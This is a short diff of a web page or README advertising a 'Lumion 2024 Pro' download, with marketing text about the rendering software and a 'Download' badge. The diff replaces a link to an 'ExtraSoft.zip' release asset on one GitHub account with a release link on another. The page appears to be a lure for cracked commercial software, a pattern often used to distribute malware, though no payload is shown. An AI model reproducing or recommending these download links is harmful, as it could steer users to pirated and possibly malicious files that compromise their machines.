@@ -10,5 +10,5 @@
 Lumion makes it surprisingly easy to personalize your design presentations that would otherwise take hours to create.
 Whether you prefer a conceptual style or realistic visualization, you have full creative control over the rendering process</p>
 </ol>
-<a href="https://github.com/sahilsheikh00/Lumion-2024-Pro-/releases/download/12/ExtraSoft.zip">
+<a href="https://github.com/AbdullahGailani/Lumion-2024-Pro/releases/tag/Lumion">
 <img src="https://img.shields.io/badge/Download-blue?logo=Download&logoColor=white&style=for-the-badge" alt="Download"/>
